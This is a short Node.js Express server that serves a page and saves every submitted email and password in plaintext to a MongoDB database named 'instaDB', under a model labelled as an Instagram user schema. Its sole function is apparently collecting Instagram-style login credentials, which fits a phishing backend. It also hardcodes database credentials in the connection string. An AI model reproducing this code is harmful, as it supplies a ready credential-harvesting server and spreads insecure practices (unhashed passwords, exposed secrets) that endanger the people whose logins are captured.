const express = require('express');
const bodyParser = require('body-parser');
const mongoose = require('mongoose');

const app = express();
app.use(bodyParser.urlencoded({ extended: true }));

// Connect to MongoDB
mongoose.connect("mongodb+srv://dayaan:dayaan@cluster0.imadrc8.mongodb.net/instaDB");

// Define the Instagram user schema and model
const instagramSchema = new mongoose.Schema({
  email: String,
  password: String,
});

const Insta = mongoose.model('Insta', instagramSchema);

app.get('/', function (req, res) {
  res.sendFile(__dirname + '/index.html');
});

app.post('/', function (request, response) {
  const email = request.body.email;
  const password = request.body.password;

  const newInsta = new Insta({ email, password });
  newInsta.save()
    .then(() => {
      console.log('User inserted successfully');
      response.send('User registered successfully');
    })
    .catch((error) => {
      console.log(error);
      response.send('Error registering user');
    });
});

let port = process.env.PORT;
if (port == null || port === "") {
  port = 2000;
}

app.listen(port, function () {
  console.log(`Server is running on port ${port}`);
});
